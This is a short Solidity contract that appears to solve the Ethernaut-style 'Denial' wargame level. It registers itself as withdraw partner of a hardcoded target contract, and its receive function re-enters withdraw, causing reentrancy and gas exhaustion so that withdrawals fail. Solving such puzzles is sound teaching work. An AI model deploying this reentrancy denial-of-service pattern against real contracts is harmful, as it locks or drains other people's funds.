// SPDX-License-Identifier: MIT
pragma solidity ^0.6.1;
import '@openzeppelin/contracts@3.4/math/SafeMath.sol';
interface IDenial {
    function contractBalance() external view returns (uint);
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Approval{
    IDenial a = IDenial(0x71169960999ccbC372795E8b92811b66ebe35844);
    // allow deposit of funds
    uint public count = 0;
    function setWithdrawPartner() public{
        a.setWithdrawPartner(address(this));
    }

    function contractBalance() public view returns (uint) {
        return a.contractBalance();
    }

    receive() external payable {
        a.withdraw();
        count++;
    }

}